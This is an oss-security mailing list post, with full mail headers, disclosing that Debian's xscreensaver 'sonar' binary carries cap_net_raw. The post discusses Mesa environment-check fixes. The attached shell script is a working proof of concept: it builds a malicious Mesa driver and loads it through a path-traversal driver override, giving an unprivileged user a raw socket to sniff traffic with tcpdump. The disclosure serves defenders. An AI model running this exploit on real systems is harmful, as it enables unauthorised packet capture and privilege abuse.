X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["6664" "Saturday" "17" "April" "2021" "07:31:05" "-0700" "Tavis Ormandy" "taviso@gmail.com" nil "231" "[oss-security] xscreensaver package caps gets raw socket" nil nil nil "4" nil nil (number mark "U       taviso@gmail Apr 17  231/6664  " thread-indent "\"[oss-security] xscreensaver package caps gets raw socket\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] xscreensaver package caps gets raw socket" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1988 invoked by uid 550); 17 Apr 2021 17:38:28 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 11866 invoked from network); 17 Apr 2021 14:31:18 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=date:from:to:cc:subject:message-id:mime-version:content-disposition
         :user-agent;
        bh=AGb/YXUyWK4ZKGUysm4H52zAZIDgciSRpTFfDIZ2dN0=;
        b=IDmIAsL0zaHqAh4FaeXQRMbF+pmrchYnuJyyInyUXhBihhbB/K8AyHM+ToOO9jd2O5
         YkQUsXBFVST5H2IA7+cPYKg3+U2g2rSvzKzqc2AJdI63g8cjeWSTfLLDR+xU6BW+LfHL
         AaeH/BZ0ODwtMVqusZ3flPgpMTIDhdVF/MACSUp6mLOOb2kx8QdV9Ib6+fMSZQFBZBKq
         GNqpxooZ9899geAmh3UvF4iyXbbPolpKJc8ZlTZl2ca3Ruv+Wb6c7QqPwy8davwACfCD
         Ivv0VwS9Pkk3Omk+kMS9ErbB6cMi0YGJT8kGl2lQ6WlJTfuzMQfgBdQPom0lLaguZaOU
         b+vQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:date:from:to:cc:subject:message-id:mime-version
         :content-disposition:user-agent;
        bh=AGb/YXUyWK4ZKGUysm4H52zAZIDgciSRpTFfDIZ2dN0=;
        b=e/Venvmc8SiiWRFhxCEWD1wty63PrcUclCUsIKFVZd4McQICeXEJAct6ySPAvWMb3O
         2dgMmRrtw7c7zJ4IscQrS4o00zzT8PbTdb4mg6TEK5BdZ+4pg5kYNE+FiotgcLsf4WVW
         nP9Spfp10dnzD0n77cxSVNcrwOAgFRAfLja9kLIBD7dcoMVcLA7X57+1Q1qAl7sVDg15
         1gKhKLkFoOTxH0qOP36kzB6OlEv3V7v8uwCpHS9lSNayips5qEfWdZuNofu9QG5MUk/5
         c+yxxe5npYMmOvPQT8MuQPvpYs5cwYp1zNxdUjoFNjspbtNfupiHwcm2d7gfISXfm5Sw
         KeBw==
X-Gm-Message-State: AOAM533HOscBsdJBTUFina3HhFCCgaFobJ9WOpZna5x8uJ3Gx1em/lQT
	CjaPB6NntJtjjpoTxXbcH/9MV7PCSVNrL42K
X-Google-Smtp-Source: ABdhPJxEzYQz1Kd+1sg5yxNJTA4j9BuPESrHKERWzKN1kPFE1sL1XTTM45p2stXOIgrYNWbkd7x41A==
X-Received: by 2002:a17:90a:ff06:: with SMTP id ce6mr14886543pjb.204.1618669866261;
        Sat, 17 Apr 2021 07:31:06 -0700 (PDT)
Date: Sat, 17 Apr 2021 07:31:05 -0700
From: Tavis Ormandy <taviso@gmail.com>
To: oss-security@lists.openwall.com
Cc: security@debian.org
Message-ID: <20210417143105.GB3276@thinkstation>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="UugvWAfsgieZRqgk"
Content-Disposition: inline
User-Agent: Mutt/1.13.2 (2019-12-18)
Subject: [oss-security] xscreensaver package caps gets raw socket

--UugvWAfsgieZRqgk
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hello, I noticed that at least debian (maybe others) ship xscreensaver
hack with cap_net_raw enabled:

$ getcap /usr/libexec/xscreensaver/sonar
/usr/libexec/xscreensaver/sonar cap_net_raw=p

That seems like a bug, you can just load some driver and get a raw
socket. I wrote a quick exploit, this script will run tcpdump without
needing root.

$ bash sock.sh
17:43:55.000000 IP (tos 0x0, ttl 64, id 14541, offset 0, flags [DF], proto ICMP (1), length 84)
    debian > sfo07s17-in-f78.1e100.net: ICMP echo request, id 59166, seq 1, length 64
17:43:55.000000 IP (tos 0x0, ttl 128, id 42276, offset 0, flags [none], proto ICMP (1), length 84)
    sfo07s17-in-f78.1e100.net > debian: ICMP echo reply, id 59166, seq 1, length 64

I sent a report to debian, jwz and mesa. We concluded no embargo is
necessary, so continuing the discussion here.

Summary of discussion so far:

- In theory, mesa support running in a privileged context, their
  documentation says they disable dangerous features in setuid/setgid
  binaries:

    https://mesa-docs.readthedocs.io/en/latest/egl.html

  In fact, this is broken because they only check if (geteuid() !=
  getuid()) { ... }. That check doesn't even handle setgid, let alone file
  caps. If mesa agree this is a bug, simply changing their checks to if
  (getauxval(AT_SECURE)) { ... } might make this bug go away, and handle
  file caps and setgid for free. I filed a bug for that, but there
  hasn't been a response:
  https://gitlab.freedesktop.org/mesa/mesa/-/issues/4549

- The code could use ping sockets instead, but they're still rarely
  enabled by default, and users have to set the ping_group_range sysctl.
  I personally think it's time to enable them by default, but that's a
  different discussion :-)

- If neither of those two options work, then I guess we will have to
  try to make using mesa safe...but it sounds really hard. The obvious
  fix for right now is trying to clean up the environment, e.g.:

  (Note: untested)

    char *allowed[][2] = {
        { "DISPLAY", 0 },
        { "XAUTHORITY", 0 },
        NULL,
    };
    for (int i = 0; allowed[i][0]; i++)  {
        if (getenv(allowed[i][0])) {
            allowed[i][1] = strdup(getenv(allowed[i][0]));
        }
    }
    if (clearenv() != 0) {
        abort();
    }
    for (int i = 0; allowed[i][0]; i++)  {
        if (allowed[i][1]) {
            setenv(allowed[i][0], allowed[i][1], 1);
            free(allowed[i][1]);
        }
    }

    // ...
    MesaInitWhatever();

I *think* this will work in main(), but it's possible there are some
constructors somewhere that execute before main() I've missed. If that's
the case, then I guess we will need a wrapper binary that does execve()
and passes a non-cloexec fd with a sanitized environment?

The problem is that even if we make cleaning up the environment work,
you're always going to need $DISPLAY, and any code exec bug connecting
to a malicious X server will be a security bug.... and that sounds super
hard to get right?

I dunno, thoughts on fixing this appreciated...

Tavis.

-- 
 _o)            $ lynx lock.cmpxchg8b.com
 /\\  _o)  _o)  $ finger taviso@sdf.org
_\_V _( ) _( )  @taviso

--UugvWAfsgieZRqgk
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="sonar-sock-demo.sh"

#!/bin/sh
#
# You can use xscreensaver to get tcpdump to work without needing root.
#

tmpdir=$(mktemp -d)

cat << EOF > ${tmpdir}/sock.c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <linux/if_ether.h>
#include <sys/capability.h>
#include <err.h>
#include <time.h>

#define PCAP_MAGIC 0xa1b2c3d4
#define PCAP_MAJOR 2
#define PCAP_MINOR 4
#define LINKTYPE_ETHERNET 1

static struct {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    int32_t  thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} pcaphdr;

static struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} rechdr;

static const cap_value_t caplist[] = { CAP_NET_RAW };

void __attribute__((constructor)) init()
{
    FILE *tcpdump;
    int sock;
    cap_t caps;
    char buffer[IP_MAXPACKET];

    // Enable CAP_NET_RAW
    caps = cap_get_proc();
    cap_set_flag(caps, CAP_EFFECTIVE, 1, caplist, CAP_SET);
    cap_set_proc(caps);
    cap_free(caps);

    // Now we can get a raw socket.
    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (sock < 0) {
        err(EXIT_FAILURE, "failed to create socket");
    }

    // Prepare a pcap header
    pcaphdr.magic_number = PCAP_MAGIC;
    pcaphdr.version_major = PCAP_MAJOR;
    pcaphdr.version_minor = PCAP_MINOR;
    pcaphdr.snaplen = sizeof(buffer);
    pcaphdr.network = LINKTYPE_ETHERNET;

    tcpdump = popen("/usr/bin/tcpdump -vv -r- || /usr/sbin/tcpdump -vv -r-", "w");

    if (tcpdump == NULL) {
        err(EXIT_FAILURE, "you dont have tcpdump installed");
    }

    if (fwrite(&pcaphdr, sizeof(pcaphdr), 1, tcpdump) != 1) {
        err(EXIT_FAILURE, "failed to write pcap header");
    }

    while (true) {
        ssize_t cnt = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);

        if (cnt < 0) {
            err(EXIT_FAILURE, "failed to read from socket");
        }

        rechdr.ts_sec = time(0);
        rechdr.incl_len = cnt;
        rechdr.orig_len = cnt;

        if (fwrite(&rechdr, sizeof(rechdr), 1, tcpdump) != 1) {
            err(EXIT_FAILURE, "failed to write record header");
        }

        if (fwrite(buffer, cnt, 1, tcpdump) != 1) {
            err(EXIT_FAILURE, "failed to write packet");
        }

        fflush(tcpdump);
    }
}
EOF

if ! gcc -fPIC -shared -o ${tmpdir}/swrast_dri.so ${tmpdir}/sock.c -lcap; then
    echo compile failed, make sure libcap-dev and gcc available
    exit 1
fi

if ! test -x /usr/bin/tcpdump -o -x /usr/sbin/tcpdump; then
    echo you dont have tcpdump installed, its used by this poc
    exit 1
fi

if ! test -x /usr/libexec/xscreensaver/sonar; then
    if ! test -x /usr/lib/xscreensaver/sonar; then
        echo you dont seem to have xscreensaver installed
        exit 1
    else
        sonar=/usr/lib/xscreensaver/sonar
    fi
else
    sonar=/usr/libexec/xscreensaver/sonar
fi

if ! env LIBGL_DRIVERS_PATH=${tmpdir}                                   \
         MESA_LOADER_DRIVER_OVERRIDE=../../../../../../${tmpdir}/swrast \
         ${sonar}; then
    echo failed to run xsreensaver
    exit 1
fi

--UugvWAfsgieZRqgk--
